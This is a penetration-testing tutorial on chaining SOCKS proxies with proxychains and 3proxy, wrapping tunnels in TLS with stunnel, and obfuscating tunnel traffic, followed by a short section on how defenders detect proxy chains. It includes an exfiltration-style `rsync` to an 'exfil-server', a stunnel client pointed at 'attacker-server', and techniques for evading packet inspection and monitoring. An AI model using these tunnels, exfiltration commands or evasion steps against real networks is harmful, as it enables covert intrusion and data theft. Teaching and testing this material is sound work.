# SOCKS Proxy Chaining and Traffic Masking

> Guide to building SOCKS proxy chains, configuring traffic masking layers, and wrapping tunnels in TLS. Covers proxychains, 3proxy, stunnel TLS wrapping, traffic obfuscation techniques, and defense against proxy chain analysis.

## Introduction and Objectives

Proxy chaining and traffic masking are essential techniques for maintaining operational security during penetration testing. By routing traffic through multiple proxy layers and wrapping connections in TLS encryption, testers can defeat traffic analysis, deep packet inspection, and attribution attempts. This guide covers the full proxy chain toolkit from application-level routing to TLS wrapping and advanced obfuscation techniques.

**Learning objectives**:

- Configure proxychains for strict, dynamic, and random proxy routing modes
- Deploy 3proxy for authenticated SOCKS/HTTP proxy services with parent chaining
- Use stunnel to add TLS encryption to any TCP tunnel, defeating deep packet inspection
- Apply traffic shaping, timing obfuscation, and distribution techniques
- Understand proxy chain detection from the defender's perspective

**Prerequisites**: At least one tunnel endpoint (from ssh-http-tunneling-pivoting or dns-icmp-covert-tunnel guides). Understanding of SOCKS4/5 and HTTP proxy protocols. Basic TLS/SSL concepts.

## 1. Proxychains -- Application-Level Proxy Routing

Proxychains intercepts TCP connections from any application and routes them through a chain of SOCKS or HTTP proxies. It is the primary tool for routing unmodified applications through tunnel infrastructure.

**Configuration modes**:

- `strict_chain` -- All proxies must be reachable; connection fails if any proxy is down. Most secure (full chain always used) but least resilient.
- `dynamic_chain` -- Skip unreachable proxies and continue through remaining chain. Resilient but may expose traffic if proxies fail silently.
- `random_chain` -- Select random path through proxy list. Good for distributing traffic but unpredictable for testing.

```bash
# Strict chain configuration (most reliable for testing)
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 10.0.0.5 1080
http 192.168.1.100 8080
EOF

# Dynamic chain with failover
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 10.0.0.10 1080
EOF

# Route applications through proxy chain
proxychains4 nmap -sT -Pn 10.10.10.0/24 --top-ports 100
proxychains4 curl http://internal-service.local/api/health
proxychains4 ssh user@deep-target
proxychains4 mysql -h 10.10.20.50 -u admin -p
proxychains4 xfreerdp /v:10.10.20.100 /u:admin
```

**DNS resolution through proxies**: Enable `proxy_dns` to prevent DNS leaks. Without it, DNS queries resolve locally, revealing the target hostnames you are accessing. This is critical for operational security -- DNS leaks can expose the scope of your tunnel usage to network monitoring.

**Performance tuning**: Increase `tcp_connect_time_out` for slow tunnels (DNS/ICMP). Decrease `tcp_read_time_out` for responsive networks. Each proxy hop adds latency; chains with more than 3 hops become impractical for interactive use.

## 2. 3proxy -- Lightweight Proxy Server with Chaining

3proxy is a compact, cross-platform proxy server supporting HTTP, SOCKS4, and SOCKS5 protocols. It handles authentication, access control, and parent proxy chaining in a single configuration file.

```bash
# Basic SOCKS5 + HTTP proxy with authentication
cat > /etc/3proxy/3proxy.cfg << 'EOF'
daemon
nserver 8.8.8.8
nscache 65536
timeouts 1 5 30 60 180 1800 15 60

users operator:CL:SecurePassword123
auth strong
allow operator

# SOCKS5 proxy on port 1080
socks -p1080 -i0.0.0.0

# HTTP proxy on port 3128
proxy -p3128 -i0.0.0.0
EOF

3proxy /etc/3proxy/3proxy.cfg

# Proxy chaining through upstream proxy
cat > /etc/3proxy/chained.cfg << 'EOF'
daemon
auth none

# Local SOCKS proxy that forwards through upstream
socks -p1080

# Chain all traffic through parent SOCKS5 proxy
parent 1000 socks5 upstream-proxy.example.com 1080
EOF

# 3proxy with ACL restricting access by source IP
cat > /etc/3proxy/acl.cfg << 'EOF'
daemon
auth iponly
allow * 192.168.0.0/16
socks -p1080
EOF
```

**3proxy advantages over direct SOCKS tunnels**: Authentication prevents unauthorized use of the proxy. ACLs restrict access by source IP. Parent chaining enables multi-level proxy topologies. Logging records all connections for engagement documentation. Runs as a daemon for persistence.

## 3. Stunnel -- TLS Wrapping for Protocol Obfuscation

Stunnel adds TLS encryption to any TCP connection, hiding the underlying protocol from deep packet inspection. It operates as a TLS proxy -- accepting TLS connections on one side and forwarding plain TCP on the other.

```bash
# Generate self-signed certificate
openssl req -new -x509 -days 365 -nodes \
  -out /etc/stunnel/stunnel.pem \
  -keyout /etc/stunnel/stunnel.pem

# Stunnel server: accept TLS on 443, forward to local chisel on 8080
cat > /etc/stunnel/server.conf << 'EOF'
cert = /etc/stunnel/stunnel.pem
key = /etc/stunnel/stunnel.pem

[chisel-tls]
accept = 0.0.0.0:443
connect = 127.0.0.1:8080
EOF

stunnel /etc/stunnel/server.conf

# Stunnel client: accept local TCP, connect via TLS to server
cat > /etc/stunnel/client.conf << 'EOF'
client = yes

[chisel-tls]
accept = 127.0.0.1:9090
connect = attacker-server:443
EOF

stunnel /etc/stunnel/client.conf

# Now connect chisel through the stunnel TLS wrapper
chisel client http://127.0.0.1:9090 R:socks

# Verify TLS wrapping with tcpdump -- only TLS visible
tcpdump -i eth0 port 443 -nn -X | head
```

**Stunnel wrapping patterns**:

- **Wrap chisel HTTP tunnel**: Stunnel hides chisel HTTP headers inside TLS. DPI sees only HTTPS traffic.
- **Wrap SOCKS proxy**: Stunnel encrypts the SOCKS handshake and all subsequent data. Prevents SOCKS protocol detection.
- **Wrap socat relay**: Stunnel adds TLS to any TCP relay, protecting relay traffic from interception.
- **Wrap custom tools**: Any tool that connects to localhost can be routed through stunnel client to a remote TLS endpoint.

**Certificate considerations**: Self-signed certificates work for testing but will fail certificate validation if the target has TLS inspection. For production tunnel infrastructure, use certificates from a legitimate CA (Let's Encrypt) on the server side. The client configuration ignores certificate validation by default, which is acceptable for penetration test infrastructure.

## 4. Traffic Obfuscation Techniques

Beyond basic tunneling and TLS wrapping, several techniques further reduce the detectability of tunnel traffic.

### Traffic Shaping

```bash
# Limit bandwidth through tunnel to mimic normal browsing patterns
# Using trickle (per-application bandwidth limiter)
trickle -d 500 -u 100 proxychains4 curl http://target

# Using tc (system-level traffic control)
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms

# Schedule large transfers during business hours
# Use at/cron to delay bulk operations:
echo "proxychains4 rsync -av data/ user@exfil-server:/backup/" | at 14:00
```

### Domain Fronting (for HTTP tunnels)

Domain fronting uses different hostnames in the SNI field and HTTP Host header to make TLS traffic appear to connect to a legitimate service while actually routing to the tunnel endpoint. This requires a CDN or fronting-capable infrastructure.

```
# Conceptual: TLS SNI = cdn-legitimate-site.com
# HTTP Host header = tunnel-handler.attacker-cdn.com
# CDN routes based on Host header, not SNI
```

### Traffic Distribution

```bash
# Distribute traffic across multiple tunnel endpoints
cat > /etc/proxychains4.conf << 'EOF'
random_chain
chain_len = 2
proxy_dns
[ProxyList]
socks5 tunnel1.example.com 1080
socks5 tunnel2.example.com 1080
socks5 tunnel3.example.com 1080
EOF

# Use different protocols at each hop
# Hop 1: TLS-wrapped HTTP (stunnel + chisel)
# Hop 2: DNS tunnel (dnscat2)
# Hop 3: SOCKS5 via SSH
# This avoids a single protocol fingerprint across the entire chain
```

### Timing Obfuscation

```bash
# Add random delays between operations through the tunnel
for host in $(cat targets.txt); do
  proxychains4 nmap -sT -Pn "$host" --top-ports 20
  sleep $((RANDOM % 60 + 30))  # Random 30-90 second delay
done
```

## 5. Defense Against Proxy Chain Analysis

From the defender's perspective, detecting proxy chains requires correlating multiple indicators across network layers.

### Detection Approaches

**Flow analysis**: Track connection patterns per host. A host that makes sequential connections to multiple internal hosts on unusual ports is likely acting as a proxy relay. Use NetFlow or sFlow data to identify connection fan-out patterns.

**Protocol anomaly detection**: Monitor for SOCKS handshake bytes (0x05 for SOCKS5, 0x04 for SOCKS4) in unexpected connections. Look for HTTP connections that carry binary data without proper HTTP semantics. Flag TLS connections that use self-signed certificates or connect to uncommon ports.

**Behavioral baselining**: Establish normal traffic patterns per host and alert on deviations. A workstation that suddenly begins relaying traffic for multiple other hosts is suspicious. Monitor for TUN/TAP interface creation on endpoints.

**Endpoint monitoring**: Track process execution of known tunneling tools (chisel, socat, gost, ptunnel, dnscat2). Monitor for unusual network listener creation. Detect DLL injection or process hollowing that may hide tunnel processes.

### Counter-Detection for Testers

- Use standard ports (443 for TLS, 80 for HTTP, 53 for DNS) to blend with legitimate traffic
- Match traffic timing to business hours and normal usage patterns
- Limit traffic volume to avoid volume-based anomalies
- Clean up tunnel processes and TUN interfaces after each engagement
- Document all tunnel infrastructure for the engagement report
- Verify tunnel cleanup with process and network state checks before disconnecting

## Hands-on Exercise: Proxy Chain and TLS Wrapping

Practice building and testing proxy chains with TLS wrapping:

**Setup**:

```bash
# You need at least two machines with tunnel connectivity established
# Machine 1: Attacker workstation
# Machine 2: Pivot host with SOCKS proxy running (from previous exercises)
```

**Exercise steps**:

1. Configure proxychains in strict mode with two SOCKS proxies and test connectivity
2. Switch to dynamic_chain mode and test failover when one proxy becomes unavailable
3. Deploy 3proxy on the pivot host with authentication and verify access control
4. Set up stunnel server/client pair to wrap a chisel tunnel in TLS
5. Verify with tcpdump that the tunnel traffic appears as TLS on the wire
6. Configure traffic shaping with trickle to limit bandwidth through the proxy chain
7. Build a random_chain configuration that distributes across three tunnel endpoints
8. Capture proxy chain traffic and attempt to identify proxy patterns from a defender's perspective

**Validation criteria**: Successfully route nmap and curl traffic through a multi-hop proxy chain. Wrap tunnel traffic in TLS and verify protocol obfuscation with packet capture. Demonstrate at least two traffic obfuscation techniques.

## References and Resources

- **ssh-http-tunneling-pivoting.md** -- For building the underlying tunnel infrastructure that proxychains routes through
- **dns-icmp-covert-tunnel.md** -- For DNS and ICMP tunnels that can be included in proxy chains
- **post-exploitation skill** -- For the broader lateral movement context
- **network-pentest skill** -- For network reconnaissance before tunnel construction
- [proxychains-ng GitHub](https://github.com/rofl0r/proxychains-ng)
- [3proxy Documentation](https://3proxy.org/doc/)
- [stunnel Documentation](https://www.stunnel.org/)
- [HackTricks - Proxychains](https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting/proxychains)
